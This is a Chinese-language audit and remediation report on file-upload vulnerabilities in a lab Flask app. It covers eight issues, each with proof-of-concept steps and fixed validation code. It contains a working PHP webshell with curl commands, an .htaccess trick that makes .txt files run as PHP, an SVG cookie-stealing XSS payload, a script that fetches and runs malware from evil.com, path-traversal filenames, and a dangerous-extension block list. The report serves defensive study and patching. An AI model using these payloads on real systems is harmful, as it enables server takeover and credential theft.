# Day 4 — 文件上传漏洞审计与修复报告

| 字段 | 值 |
|------|------|
| **报告名称** | 文件上传漏洞审计与修复报告 |
| **报告编号** | Day4-FileUpload-20260721 |
| **报告人** | 王君豪 |
| **目标地址** | `http://192.168.137.129:5000/upload` |
| **应用名称** | 用户管理系统（Flask + SQLite） |
| **审计日期** | 2026-07-21 |
| **漏洞总数** | 8 个（高危 4，中危 4） |
| **修复数量** | 8 个（全部已修复） |
| **修复状态** | ✅ 全部已修复 |

---

## 一、漏洞汇总

### 🔴 高危漏洞（4个）

| # | 漏洞名称 | 影响位置 | 严重等级 |
|---|---------|---------|---------|
| V-U01 | **任意文件上传（无扩展名/内容校验）** | `/upload` POST | 🔴 高危 |
| V-U04 | **SVG 文件 XSS 上传** | `/upload` POST | 🔴 高危 |
| V-U05 | **.htaccess 文件上传（Apache 部署时配置篡改）** | `/upload` POST | 🔴 高危 |
| V-U06 | **PHP WebShell 上传（PHP 部署时远程代码执行）** | `/upload` POST | 🔴 高危 |

### 🟠 中危漏洞（4个）

| # | 漏洞名称 | 影响位置 | 严重等级 |
|---|---------|---------|---------|
| V-U07 | **文件覆盖攻击** | `/upload` POST | 🟠 中危 |
| V-U08 | **Content-Type MIME 类型篡改** | `/upload` POST | 🟠 中危 |
| V-U09 | **无扩展名文件上传** | `/upload` POST | 🟠 中危 |
| V-U10 | **双扩展名文件上传（如 `test.php.jpg`）** | `/upload` POST | 🟠 中危 |

---

## 二、漏洞原理、利用方式与修复方案（逐漏洞详解）

---

### V-U01：任意文件上传（无扩展名/内容校验）

#### 漏洞原理

上传功能对用户上传的文件**不做任何检查**：不检查扩展名、不检查文件内容（魔术字节）、不检查 MIME 类型、不检查文件大小。攻击者可上传任意类型的文件。

#### 攻击流程

```mermaid
攻击者 → 选择恶意文件（如 shell.php）→ POST /upload → 文件保存到 static/uploads/
        → 浏览器访问 /static/uploads/shell.php → 文件被服务端返回 → 攻击成功
```

#### 漏洞代码（修复前）

```python
# 第361-364行 — 零校验
filename = f.filename                           # 原始文件名直接使用
save_path = os.path.join(UPLOAD_FOLDER, filename)
f.save(save_path)                               # 直接保存，无任何检查
file_url = f"/static/uploads/{filename}"         # 直接返回可访问URL
```

**代码逐行分析：**

| 行 | 问题 | 攻击者可利用的点 |
|----|------|----------------|
| `filename = f.filename` | 未做任何清洗/校验 | 可包含 `../` 路径遍历、空字节 `\x00`、危险扩展名 `.php` |
| `f.save(save_path)` | 未检查文件内容 | 任意文件内容写入服务器磁盘 |
| `file_url = f"/static/uploads/{filename}"` | 直接暴露可访问URL | 任意用户可访问该文件 |

#### 攻击 POC

```bash
# 上传 PHP WebShell
curl -X POST http://target/upload -F "file=@shell.php"
# → 成功保存，直接访问 http://target/static/uploads/shell.php

# 上传 HTML XSS
curl -X POST http://target/upload -F "file=@evil.html"
# → 成功保存，访问后执行恶意 JS

# 路径遍历逃逸
curl -X POST http://target/upload -F "file=@test.txt;filename=../../etc/evil.txt"
# → 试图将文件写到 static/uploads/ 之外的目录
```

#### 修复方案

**修复策略：** 采用**三层防御**（扩展名白名单 → Content-Type 校验 → 魔术字节校验），从外到内层层过滤。

**修复后代码（完整上传逻辑）：**

```python
# ===== 配置层 =====

# 白名单：仅允许图片扩展名
ALLOWED_EXTENSIONS = {"png", "jpg", "jpeg", "gif", "webp", "bmp"}

# 白名单：仅允许图片 MIME 类型
ALLOWED_MIMETYPES = {"image/png", "image/jpeg", "image/gif", "image/webp", "image/bmp"}

# 黑名单：明确拒绝的危险扩展名（防止双扩展名绕过）
DANGEROUS_EXTENSIONS = {
    "php", "phtml", "php3", "php4", "php5", "php7", "pht", "phps",
    "asp", "aspx", "jsp", "jspx",
    "exe", "sh", "py", "pl", "cgi",
    "htaccess", "htpasswd",
}

# 魔术字节签名库
IMAGE_SIGNATURES = {
    b"\x89PNG\r\n\x1a\n": "image/png",       # PNG
    b"\xff\xd8\xff": "image/jpeg",            # JPEG
    b"GIF87a": "image/gif",                   # GIF
    b"GIF89a": "image/gif",                   # GIF
    b"RIFF": "image/webp",                    # WEBP (需进一步验证)
    b"BM": "image/bmp",                        # BMP
}


# ===== 校验函数层 =====

def secure_filename_original(name):
    """
    清洗文件名，防止路径遍历和空字节注入。
    
    处理流程：
    1. 将反斜杠统一为正斜杠（防 Windows 路径遍历）
    2. 只取最后一层路径（防 ../ 目录跳转）
    3. 删除空字节（防 %00 截断攻击）
    """
    name = name.replace("\\", "/")                    # Windows → Unix 路径
    name = name.rsplit("/", 1)[-1] if "/" in name else name  # 去掉目录部分
    name = name.replace("\x00", "")                   # 清除空字节
    return name


def allowed_file(filename):
    """
    扩展名白名单校验 + 危险扩展名黑名单。
    
    校验流程（按顺序执行）：
    Step 1: 检查是否包含扩展名（必须有 .）
    Step 2: 检查最后一个扩展名是否在白名单中
    Step 3: 检查文件名是否以点开头（隐藏文件）
    Step 4: 检查文件名每一段是否在危险扩展名中
    """
    # Step 1: 拒绝无扩展名文件
    if "." not in filename:
        return False
    
    # Step 2: 白名单校验（仅取最后一个扩展名）
    ext = filename.rsplit(".", 1)[1].lower()
    if ext not in ALLOWED_EXTENSIONS:
        return False
    
    # Step 3: 拒绝隐藏文件（以 . 开头）
    if filename.startswith("."):
        return False
    
    # Step 4: 检查文件名的每一段是否含危险扩展名
    # 例如 test.php.png → parts = ["test", "php", "png"]
    # "php" 在 DANGEROUS_EXTENSIONS 中 → 拒绝
    parts = filename.lower().split(".")
    for part in parts:
        if part in DANGEROUS_EXTENSIONS:
            return False
    
    return True


def validate_image_content(file_storage):
    """
    魔术字节校验：通过读取文件头判断是否为真实图片。
    
    支持的格式及对应签名：
    ┌─────────┬──────────────────────────────┐
    │ PNG     │ 89 50 4E 47 0D 0A 1A 0A      │
    │ JPEG    │ FF D8 FF                      │
    │ GIF87a  │ 47 49 46 38 37 61            │
    │ GIF89a  │ 47 49 46 38 39 61            │
    │ WEBP    │ 52 49 46 46 .... 57 45 42 50 │
    │ BMP     │ 42 4D                         │
    └─────────┴──────────────────────────────┘
    
    校验流程：
    1. 读取文件前 16 字节
    2. 跟预定义的签名列表逐个匹配
    3. 对于 WEBP（签名 RIFF），需额外检查第 8-11 字节是否为 WEBP
    4. 重置文件指针（seek(0)）以便后续 save()
    """
    header = file_storage.read(16)
    file_storage.seek(0)  # 重置指针，供后续 f.save() 使用

    for signature in IMAGE_SIGNATURES:
        if header.startswith(signature):
            # WEBP 特殊处理：RIFF + 4字节长度 + WEBP
            if signature == b"RIFF":
                return header[8:12] == b"WEBP"
            return True
    
    return False
```

**路由层调用逻辑：**

```python
# 在 upload() 路由中，按顺序执行校验：
# 第 1 层：清洗文件名（防路径遍历）
filename = secure_filename_original(f.filename)

# 第 2 层：扩展名校验（白名单 + 黑名单）
if not allowed_file(filename):
    error = "不支持的文件类型，仅允许上传图片文件（PNG/JPG/GIF/WEBP/BMP）"

# 第 3 层：Content-Type 校验
content_type = f.content_type or ""
if content_type and content_type not in ALLOWED_MIMETYPES:
    error = "文件类型不匹配，请上传有效的图片文件"

# 第 4 层：魔术字节校验（文件内容验证）
if not validate_image_content(f):
    error = "文件内容校验失败，请上传有效的图片文件"

# 第 5 层：路径合法性校验
real_path = os.path.realpath(save_path)
if not real_path.startswith(os.path.realpath(UPLOAD_FOLDER)):
    error = "非法的文件路径"

# 全部校验通过后，才执行保存
f.save(save_path)
```

#### 修复前后对比

| 对比项 | 修复前 | 修复后 |
|--------|--------|--------|
| 文件名处理 | 原始用户输入直接使用 | `secure_filename_original()` 清洗路径/空字节 |
| 扩展名校验 | ❌ 无 | ✅ 白名单 + 黑名单双层过滤 |
| MIME 校验 | ❌ 无 | ✅ 白名单匹配 |
| 文件内容校验 | ❌ 无 | ✅ 魔术字节签名匹配 |
| 路径合法性 | ❌ 无 | ✅ `os.path.realpath()` 边界检查 |
| 可上传类型 | 任意类型 | 仅 PNG/JPG/GIF/WEBP/BMP |

#### 验证结果

```bash
# 修复前 — 所有恶意文件均可上传
curl -F "file=@shell.php"     → ✅ HTTP 200 (成功)
curl -F "file=@evil.html"     → ✅ HTTP 200 (成功)

# 修复后 — 全部被阻止
curl -F "file=@shell.php"     → ❌ "不支持的文件类型"
curl -F "file=@evil.html"     → ❌ "不支持的文件类型"
curl -F "file=@evil.js"       → ❌ "不支持的文件类型"
curl -F "file=@executable"    → ❌ "不支持的文件类型"
```

---

### V-U04：SVG 文件 XSS 上传

#### 漏洞原理

SVG（Scalable Vector Graphics）本质是 XML 格式，允许嵌入 `<script>` 标签。攻击者上传包含恶意脚本的 SVG 文件后，用户访问该 SVG 文件时浏览器会执行其中的 JavaScript 代码。即使服务端设置了 `X-Content-Type-Options: nosniff`，浏览器仍然会把 SVG 作为图片+脚本混合内容解析执行。

#### XSS 攻击链

```
攻击者上传 evil.svg（含 <script>alert(document.cookie)</script>）
    ↓
SVG 文件保存在 /static/uploads/evil.svg
    ↓
攻击者将 URL 发送给受害者：http://target/static/uploads/evil.svg
    ↓
受害者浏览器渲染 SVG → 执行 <script> 中的 JS → Cookie 被盗
```

#### 漏洞代码（修复前）

```python
# upload() 路由中第361-364行
filename = f.filename           # evil.svg 被接受
save_path = os.path.join(UPLOAD_FOLDER, filename)
f.save(save_path)               # evil.svg 被保存到服务器
file_url = f"/static/uploads/{filename}"  # 返回可访问URL
```

#### POC

```xml
<?xml version="1.0" encoding="UTF-8"?>
<svg xmlns="http://www.w3.org/2000/svg" width="100" height="100">
  <script>alert(document.cookie)</script>
  <rect width="100" height="100" fill="red"/>
</svg>
```

```bash
curl -X POST http://target/upload -F "file=@evil.svg"
# 访问 http://target/static/uploads/evil.svg → 弹窗显示 cookie
```

#### 修复方案

**修复策略：** SVG 扩展名（`.svg`）不在 `ALLOWED_EXTENSIONS` 白名单中，因此直接被 `allowed_file()` 函数拒绝。无需单独编写 SVG 检测逻辑。

```python
# ALLOWED_EXTENSIONS 中不包含 "svg"
ALLOWED_EXTENSIONS = {"png", "jpg", "jpeg", "gif", "webp", "bmp"}
#                                                    ↑ SVG 不在其中
```

**校验执行流程：**

```
allowed_file("evil.svg")
  → Step 1: "." in filename?                     ✅ 是
  → Step 2: ext = "svg". lower()
  → Step 3: "svg" in ALLOWED_EXTENSIONS?         ❌ 否
  → return False                                  → 拒绝上传
```

**为什么不单独捕获 SVG：** 采用白名单策略后，未在白名单中的扩展名（包括 `.svg`、`.html`、`.php`、`.js` 等）自动被拒绝。白名单比黑名单更安全——未来即使出现新的攻击格式只要不在白名单中就无法上传。

#### 关于 `image/svg+xml` Content-Type 的处理

```python
# 即使攻击者伪造 SVG 的 Content-Type 为 image/png…
curl -F "file=@evil.svg;type=image/png"
# 会被以下两道防线拦截：

# 防线 1 — 扩展名校验
allowed_file("evil.svg") → False                ❌

# 防线 2 — 魔术字节校验
validate_image_content(f) → False（SVG 以 <?xml 开头，不匹配任何签名）❌
```

#### 验证结果

```bash
# 修复前
curl -F "file=@evil.svg"  → ✅ SVG 上传成功

# 修复后
curl -F "file=@evil.svg"  → ❌ "不支持的文件类型，仅允许上传图片文件（PNG/JPG/GIF/WEBP/BMP）"
```

| 检测项 | SVG 文件 | 结果 |
|--------|---------|------|
| 扩展名 `.svg` 在 ALLOWED_EXTENSIONS 中？ | ❌ 不在 | 被拒绝 |
| Content-Type `image/svg+xml` 在 ALLOWED_MIMETYPES 中？ | ❌ 不在 | 被拒绝 |
| 魔术字节 `<?xml` 匹配图片签名？ | ❌ 不匹配 | 被拒绝 |

---

### V-U05：.htaccess 文件上传（Apache 配置篡改）

#### 漏洞原理

Apache HTTP Server 有一个特性：每个目录下的 `.htaccess` 文件可包含目录级别的配置指令。如果攻击者能够在 `static/uploads/` 目录下上传一个恶意 `.htaccess` 文件，就可以改变 Apache 对该目录的处理行为。

#### 攻击流程

```
攻击者上传 .htaccess（内容：AddType application/x-httpd-php .txt）
    ↓
.htaccess 被保存到 static/uploads/.htaccess
    ↓
Apache 读取该 .htaccess → 将 .txt 文件也当作 PHP 解析
    ↓
攻击者上传 shell.txt（实际内容是 PHP 代码）→ 访问 → PHP 执行 → RCE
```

#### POC

```bash
# Step 1: 上传 .htaccess 开启 .txt 的 PHP 解析
echo 'AddType application/x-httpd-php .txt' > .htaccess
curl -X POST http://target/upload -F "file=@.htaccess"

# Step 2: 上传 PHP Webshell（伪装成 .txt）
echo '<?php system($_GET["cmd"]); ?>' > shell.txt
curl -X POST http://target/upload -F "file=@shell.txt"

# Step 3: 访问 PHP Webshell（Apache 将 .txt 当 PHP 执行）
curl http://target/static/uploads/shell.txt?cmd=id
# → uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

#### 漏洞代码（修复前）

```python
# filename = ".htaccess"
filename = f.filename           # .htaccess 被接受
save_path = os.path.join(UPLOAD_FOLDER, filename)
f.save(save_path)               # .htaccess 被写入 static/uploads/.htaccess
```

**问题所在：** `.htaccess` 以 `.` 开头（隐藏文件），但代码没有检查文件名前缀，也没有限制扩展名。

#### 修复方案

**修复策略：** 通过 `allowed_file()` 中的 `filename.startswith(".")` 检测，拒绝所有以点号开头的文件。

```python
def allowed_file(filename):
    # … 其他校验 …
    
    # 拒绝隐藏文件（以点号开头）
    if filename.startswith("."):
        return False
    
    # … 其他校验 …
    return True
```

**同时，`DANGEROUS_EXTENSIONS` 包含 `"htaccess"` 和 `"htpasswd"`，作为第二道防线：**

```python
DANGEROUS_EXTENSIONS = {
    # ... 其他 ...
    "htaccess", "htpasswd",   # Apache 配置文件
}

# 假设攻击者将 .htaccess 重命名为 a.htaccess（不以点开头）
# allowed_file() 的扩展名检查：
# Step 1: "." in "a.htaccess"      → True
# Step 2: ext = "htaccess"
# Step 3: "htaccess" in ALLOWED_EXTENSIONS?  → False（白名单无此扩展）
# → return False

# 假设攻击者将 .htaccess 重命名为 a.htaccess.png
# Step 1: "." in "a.htaccess.png"  → True
# Step 2: ext = "png"（最后一个）
# Step 3: "png" in ALLOWED_EXTENSIONS?  → True
# Step 4: parts = ["a", "htaccess", "png"]
# Step 5: "htaccess" in DANGEROUS_EXTENSIONS?  → True
# → return False（被危险扩展名黑名单拦截）
```

**双层防御确保 `htaccess` 绝对无法上传：**

| 攻击手法 | 第一层防御 | 第二层防御 |
|---------|-----------|-----------|
| 直接上传 `.htaccess` | `startswith(".")` 拦截 | — |
| 上传 `my.htaccess` | `"htaccess" not in ALLOWED_EXTENSIONS` | — |
| 上传 `my.htaccess.png` | — | `"htaccess" in DANGEROUS_EXTENSIONS` 拦截 |

#### 验证结果

```bash
# 修复前
curl -F "file=@.htaccess"  → ✅ 上传成功（文件存在于 static/uploads/.htaccess）

# 修复后
curl -F "file=@.htaccess"  → ❌ "不支持的文件类型"
ls static/uploads/.htaccess → ❌ 文件不存在
```

---

### V-U06：PHP WebShell 上传（PHP 环境 RCE）

#### 漏洞原理

如果项目部署在 Apache/Nginx + PHP 环境中，上传的 `.php` 文件可以被 PHP 解析器直接执行，攻击者通过 WebShell 获得服务器的远程控制权限（Remote Code Execution, RCE）。

#### 攻击流程

```
攻击者编写 PHP WebShell → 上传到服务器 → 访问该 PHP 文件
    ↓
PHP 解析器执行恶意代码 → 攻击者获得服务器控制权
    ↓
执行系统命令（id, whoami, ls, cat /etc/passwd）
上传更多恶意工具（挖矿程序、后门）
修改/删除服务器文件
```

#### POC

```php
<?php
// 极简 WebShell：通过 GET 参数 cmd 执行任意系统命令
system($_GET["cmd"]);
?>
```

```bash
# 上传 WebShell
curl -X POST http://target/upload -F "file=@shell.php"

# 执行系统命令
curl "http://target/static/uploads/shell.php?cmd=id"
# → uid=33(www-data) gid=33(www-data) groups=33(www-data)

curl "http://target/static/uploads/shell.php?cmd=ls%20-la%20/etc/passwd"
# → -rw-r--r-- 1 root root 3152 Mar 15 10:22 /etc/passwd
```

#### 漏洞代码（修复前）

```python
# filename = "shell.php"
filename = f.filename           # .php 被接受
save_path = os.path.join(UPLOAD_FOLDER, filename)
f.save(save_path)               # WebShell 被写入服务器
```

#### 修复方案

**修复策略：** 双重阻断。

**第一重：白名单拦截**
```python
ALLOWED_EXTENSIONS = {"png", "jpg", "jpeg", "gif", "webp", "bmp"}
#                     ↑ "php" 不在白名单中
```

**第二重：危险扩展名黑名单**
```python
DANGEROUS_EXTENSIONS = {
    # PHP 系列（含历史版本扩展名）
    "php", "phtml", "php3", "php4", "php5", "php7",
    "pht", "phps",
    # ASP/.NET 系列
    "asp", "aspx",
    # Java 系列
    "jsp", "jspx",
    # 可执行文件
    "exe", "sh", "py", "pl", "cgi",
}
```

**为什么需要危险扩展名黑名单（在已有白名单的情况下）：** 白名单只允许 6 种图片格式，理论上 `.php` 已经被白名单拒绝。但双扩展名场景（如 `.php.png`）需要依赖黑名单来确保即使最后一个扩展名是 `png`，只要中间段包含 `php` 就拒绝。详见 V-U10 的修复。

**校验流程（以 shell.php 为例）：**

```
allowed_file("shell.php")
  → Step 1: "." in "shell.php"?                   ✅ 是
  → Step 2: ext = "php"
  → Step 3: "php" in ALLOWED_EXTENSIONS?          ❌ 否
  → return False                                   → 拒绝
```

**其他危险扩展名对照表：**

| 扩展名 | 对应技术 | 攻击类型 | 修复前 | 修复后 |
|--------|---------|---------|--------|--------|
| `.php` | PHP | WebShell RCE | ✅ 可上传 | ❌ 被阻止 |
| `.phtml` | PHP（替代扩展） | WebShell RCE | ✅ 可上传 | ❌ 被阻止 |
| `.php5` | PHP 5.x | WebShell RCE | ✅ 可上传 | ❌ 被阻止 |
| `.asp` | ASP Classic | WebShell RCE | ✅ 可上传 | ❌ 被阻止 |
| `.aspx` | ASP.NET | WebShell RCE | ✅ 可上传 | ❌ 被阻止 |
| `.jsp` | Java JSP | WebShell RCE | ✅ 可上传 | ❌ 被阻止 |
| `.exe` | Windows 可执行 | 恶意软件分发 | ✅ 可上传 | ❌ 被阻止 |
| `.sh` | Shell 脚本 | 服务器命令执行 | ✅ 可上传 | ❌ 被阻止 |
| `.py` | Python 脚本 | 服务器代码执行 | ✅ 可上传 | ❌ 被阻止 |
| `.cgi` | CGI 脚本 | WebShell RCE | ✅ 可上传 | ❌ 被阻止 |

#### 验证结果

```bash
# 修复前 — 所有 PHP 变体均可上传
curl -F "file=@shell.php"     → ✅ 成功
curl -F "file=@shell.phtml"   → ✅ 成功
curl -F "file=@shell.php5"    → ✅ 成功

# 修复后 — 全部被阻止
curl -F "file=@shell.php"     → ❌ "不支持的文件类型"
curl -F "file=@shell.phtml"   → ❌ "不支持的文件类型"
curl -F "file=@shell.php5"    → ❌ "不支持的文件类型"

# 真实 PNG 图片不受影响
curl -F "file=@real.png"      → ✅ 成功
```

---

### V-U07：文件覆盖攻击

#### 漏洞原理

上传接口对文件名不做唯一性检查。如果用户 A 上传了 `avatar.png`，用户 B 再次上传同名的 `avatar.png`，后者会**静默覆盖**前者。攻击者可利用此漏洞：
1. 覆盖其他用户的头像文件
2. 覆盖系统关键文件（如果可以路径穿越到系统目录）
3. 覆盖已上传的恶意文件（替换 payload）

#### 攻击流程

```
用户 A 上传 avatar.png（正常头像）
    ↓
攻击者上传 avatar.png（恶意内容）
    ↓
用户 A 的头像被替换为恶意内容
用户 A 访问页面 → 加载恶意头像 → 攻击生效
```

#### 漏洞代码（修复前）

```python
# 不检查文件是否存在，直接覆盖写入
save_path = os.path.join(UPLOAD_FOLDER, filename)
f.save(save_path)  # 如果文件已存在，静默覆盖！
```

#### 修复方案

**修复策略：** 在 `f.save()` 之前使用 `os.path.exists()` 检查文件是否已存在，如果存在则返回错误提示。

```python
# 保存前检查文件是否已存在
save_path = os.path.join(UPLOAD_FOLDER, filename)

if os.path.exists(save_path):
    # 文件已存在，拒绝覆盖
    error = "文件已存在，请修改文件名后重试"
else:
    # 文件不存在，保存新文件
    f.save(save_path)
    file_url = f"/static/uploads/{filename}"
    success = "头像上传成功"
```

**修复逻辑流程图：**

```
用户上传文件
    ↓
检查 os.path.exists(save_path)
    ├── True  → 返回"文件已存在，请修改文件名后重试"
    │           （不执行 f.save()）
    │
    └── False → 执行 f.save() 保存文件
                ↓
            返回成功消息和文件 URL
```

**为什么不使用覆盖更新：** 在头像场景中，每个用户应该维护自己的头像文件名（如 `admin_avatar.png`），而不是用通用文件名。覆盖可能导致其他用户的数据丢失。更好的方案是为每个用户生成唯一文件名（如 `{username}_{uuid}.png`），但当前需求要求保留原始文件名，因此采用"存在即拒绝"策略。

#### 验证结果

```bash
# 第一次上传 valid_avatar.png
curl -F "file=@valid_avatar.png" → ✅ "头像上传成功"

# 第二次上传同名文件 valid_avatar.png
curl -F "file=@valid_avatar.png" → ❌ "文件已存在，请修改文件名后重试"

# 修改文件名后重新上传
curl -F "file=@valid_avatar_v2.png" → ✅ "头像上传成功"
```

| 场景 | 修复前 | 修复后 |
|------|--------|--------|
| 第 1 次上传 `photo.png` | ✅ 成功保存 | ✅ 成功保存 |
| 第 2 次上传 `photo.png` | ✅ 静默覆盖 | ❌ "文件已存在" |
| 上传不同名文件 | ✅ 正常 | ✅ 正常 |

---

### V-U08：Content-Type MIME 类型篡改

#### 漏洞原理

HTTP 协议中，客户端可通过 multipart/form-data 的 `type` 参数随意声明上传文件的 Content-Type。Flask 的 `f.content_type` 直接读取客户端声明的值，没有服务端验证。攻击者可以将恶意文件声明为合法的图片 MIME 类型来绕过仅检查 Content-Type 的防御。

#### 攻击流程

```bash
# 攻击者将一个文本文件声明为图片
curl -X POST http://target/upload \
  -F "file=@malicious.txt;type=image/png;filename=innocent.png"
#                     ↑ 攻击者伪造 Content-Type
#                     ↑ 服务端 f.content_type = "image/png"
```

#### 漏洞代码（修复前）

```python
# 修复前根本不检查 Content-Type
f.save(save_path)  # 直接保存，无视 Content-Type
```

#### 修复方案

**修复策略：** 检查客户端声明的 Content-Type 是否在允许的图片 MIME 白名单中。

```python
# MIME 类型白名单
ALLOWED_MIMETYPES = {
    "image/png",
    "image/jpeg",
    "image/gif",
    "image/webp",
    "image/bmp",
}
```

**校验逻辑：**

```python
# 获取客户端声明的 Content-Type
content_type = f.content_type or ""    # 如果未声明则为空字符串

# 校验：仅在客户端声明了 Content-Type 时才检查
# 不声明 = 不判断（由后续魔术字节把关）
# 声明了但不在白名单中 = 拒绝
if content_type and content_type not in ALLOWED_MIMETYPES:
    error = "文件类型不匹配，请上传有效的图片文件"
```

**为什么要兼容 Content-Type 为空的情况：** 某些 HTTP 客户端（如 curl 默认行为、老旧浏览器）在上传文件时可能不发送 Content-Type 头部。如果空值直接拒绝会导致这些合法用户无法上传，因此策略改为"声明了就必须合法，没声明则放行到下一层校验"。

**分层校验互补：**

| 场景 | Content-Type 校验 | 魔术字节校验 | 最终结果 |
|------|------------------|-------------|---------|
| 真实 PNG，Content-Type = `image/png` | ✅ 通过 | ✅ 匹配 PNG 签名 | ✅ 通过 |
| 真实 PNG，未声明 Content-Type | ⚠️ 跳过（空值） | ✅ 匹配 PNG 签名 | ✅ 通过 |
| 文本文件伪装 `image/png` | ✅ 通过（伪造成功） | ❌ 不匹配任何图片签名 | ❌ 拒绝 |
| exe 文件，Content-Type = `application/x-msdownload` | ❌ 拒绝 | — | ❌ 拒绝 |

**注意：** Content-Type 校验是**轻量级前置过滤**，不能单独依赖。伪造 Content-Type 非常简单（curl 的 `type=` 参数即可伪造），因此必须配合魔术字节校验。

#### 验证结果

```bash
# 测试 Content-Type 伪造
echo "fake-image" > fake.txt
curl -F "file=@fake.txt;type=image/png;filename=innocent.png"
# → ❌ "文件内容校验失败，请上传有效的图片文件"
# （Content-Type 校验通过，但魔术字节校验失败）

# 测试明确的非法 Content-Type
curl -F "file=@fake.txt;type=application/x-php;filename=innocent.png"
# → ❌ "文件类型不匹配，请上传有效的图片文件"
# （Content-Type 校验拒绝）
```

---

### V-U09：无扩展名文件上传

#### 漏洞原理

无扩展名的文件在 Linux 系统下可以直接作为可执行文件运行（如果上传目录有执行权限）。攻击者可上传 ELF 二进制文件、Shell 脚本等无扩展名恶意程序。

#### 攻击流程

```
攻击者编写恶意 Shell 脚本 → 上传（无扩展名）
    ↓
文件保存到 static/uploads/executable
    ↓
攻击者通过其他漏洞（如命令注入）执行该文件
或诱导服务器进程执行该文件
```

#### POC

```bash
# 无扩展名的 Shell 脚本
echo '#!/bin/bash' > executable
echo 'wget http://evil.com/malware -O /tmp/malware && chmod +x /tmp/malware && /tmp/malware' >> executable

# 上传
curl -X POST http://target/upload -F "file=@executable"
# → 成功保存到 static/uploads/executable
```

#### 漏洞代码（修复前）

```python
filename = f.filename          # "executable" 被直接接受
save_path = os.path.join(UPLOAD_FOLDER, filename)
f.save(save_path)               # 无扩展名的文件被保存
```

#### 修复方案

**修复策略：** 在 `allowed_file()` 中检查文件名是否包含 `.`（扩展名分隔符），不包含则拒绝。

```python
def allowed_file(filename):
    # Step 1: 拒绝无扩展名文件
    if "." not in filename:
        return False
    
    # Step 2: 白名单校验
    ext = filename.rsplit(".", 1)[1].lower()
    if ext not in ALLOWED_EXTENSIONS:
        return False
    
    # … 后续校验 …
```

**校验流程：**
```
allowed_file("executable")
  → Step 1: "." in "executable"?    ❌ 否
  → return False                     → 拒绝

allowed_file("photo")
  → Step 1: "." in "photo"?         ❌ 否
  → return False                     → 拒绝
```

**为什么无扩展名一定不安全：** 图片文件一定有扩展名（`.png`、`.jpg` 等），无扩展名的文件在 Web 场景下没有任何合理的业务用途。因此直接拒绝所有无扩展名文件是安全的。

#### 验证结果

```bash
# 修复前
curl -F "file=@executable"   → ✅ 上传成功
curl -F "file=@photo"        → ✅ 上传成功

# 修复后
curl -F "file=@executable"   → ❌ "不支持的文件类型"
curl -F "file=@photo"        → ❌ "不支持的文件类型"
curl -F "file=@photo.png"    → ✅ 上传成功（有正确扩展名）
```

---

### V-U10：双扩展名文件上传

#### 漏洞原理

文件名含有多个扩展名时（如 `test.php.jpg`），某些服务器配置下会产生解析歧义：
- **Apache MultiViews 模块：** 可能将 `.php.jpg` 识别为 PHP 文件执行
- **Windows 服务器：** 文件名末尾的点/空格可能导致扩展名截断
- **Nginx + PHP-FPM 配置不当：** 可能将 `.php.jpg` 按 PHP 解析

#### 攻击流程

```
攻击者上传 test.php.jpg（内容为 PHP 代码）
    ↓
扩展名检查只看了最后一个 .jpg（通过检查）
    ↓
Apache/Nginx 错误地将文件解析为 PHP
    ↓
PHP 代码执行 → 远程代码执行（RCE）
```

#### 漏洞代码（修复前）

```python
# 如果代码只检查最后一个扩展名：
ext = filename.rsplit(".", 1)[1].lower()   # "jpg" → 通过白名单
# 但忽略了中间的 "php"
```

#### 修复方案

**修复策略：** 在 `allowed_file()` 中增加"分段检查"逻辑：将文件名按 `.` 拆分为多段，对每一段都检查是否在危险扩展名黑名单中。

```python
def allowed_file(filename):
    # Step 1: 拒绝无扩展名文件
    if "." not in filename:
        return False
    
    # Step 2: 白名单校验（最后一个扩展名）
    ext = filename.rsplit(".", 1)[1].lower()
    if ext not in ALLOWED_EXTENSIONS:
        return False
    
    # Step 3: 拒绝隐藏文件
    if filename.startswith("."):
        return False
    
    # Step 4: 分段检查 — 文件名每一段都不能是危险扩展名
    # "test.php.jpg" → parts = ["test", "php", "jpg"]
    #                  ↑ "php" 在 DANGEROUS_EXTENSIONS 中 → 拒绝
    parts = filename.lower().split(".")
    for part in parts:
        if part in DANGEROUS_EXTENSIONS:
            return False
    
    return True
```

**校验流程对比：**

| 文件名 | 只有白名单 | 白名单 + 黑名单分段检查 |
|--------|-----------|----------------------|
| `photo.png` | ✅ 通过 | ✅ 通过 |
| `shell.php` | ❌ 拒绝（php 不在白名单） | ❌ 拒绝 |
| `test.php.jpg` | ✅ 通过（jpg 在白名单） | ❌ 拒绝（php 在黑名单） |
| `a.asp.png` | ✅ 通过（png 在白名单） | ❌ 拒绝（asp 在黑名单） |
| `a.jsp.png` | ✅ 通过 | ❌ 拒绝（jsp 在黑名单） |
| `a.htaccess.png` | ✅ 通过 | ❌ 拒绝（htaccess 在黑名单） |

**攻击者可能的绕过尝试及防御：**

```bash
# 尝试 1: test.php.jpg → 中间段有 php → 被黑名单拦截
# 尝试 2: test.PHP.jpg → 全部转小写检查 → php 匹配 → 被拦截
# 尝试 3: test.phtml.png → phtml 在黑名单 → 被拦截
# 尝试 4: test.php5.jpg → php5 在黑名单 → 被拦截
# 尝试 5: test.jpg.php → 最后一段 php 不在白名单 → 被白名单拦截
```

#### 验证结果

```bash
# 修复前
curl -F "file=@test.php.jpg"       → ✅ 上传成功（绕过）
curl -F "file=@a.asp.png"          → ✅ 上传成功（绕过）
curl -F "file=@a.jsp.png"          → ✅ 上传成功（绕过）

# 修复后
curl -F "file=@test.php.jpg"       → ❌ "不支持的文件类型"
curl -F "file=@a.asp.png"          → ❌ "不支持的文件类型"
curl -F "file=@a.jsp.png"          → ❌ "不支持的文件类型"
curl -F "file=@photo.png"          → ✅ 上传成功（正常图片不受影响）
```

---

## 三、路径遍历防护（通用安全加固）

#### 漏洞原理

攻击者可在文件名中注入 `../` 或 `..\` 路径分隔符，使文件保存到 `static/uploads/` 目录之外的位置，覆盖系统文件。

#### 修复方案

`secure_filename_original()` 函数处理三个层面的路径攻击：

```python
def secure_filename_original(name):
    """
    三层防护：
    
    第 1 层：反斜杠 → 正斜杠
    目的：统一路径分隔符，防止 Windows/Unix 混合攻击
    示例：..\\..\\evil.txt → ../../evil.txt
    
    第 2 层：只取路径最后一段
    目的：去除所有目录遍历部分
    示例：../../../etc/evil.txt → evil.txt
    示例：../../a/b/c/photo.png → photo.png
    
    第 3 层：删除空字节
    目的：防止空字节截断攻击（%00）
    示例：shell.php\x00.png → shell.php.png（去除空字节后扩展名检查仍会拒绝）
    """
    name = name.replace("\\", "/")                          # 第 1 层
    name = name.rsplit("/", 1)[-1] if "/" in name else name # 第 2 层
    name = name.replace("\x00", "")                         # 第 3 层
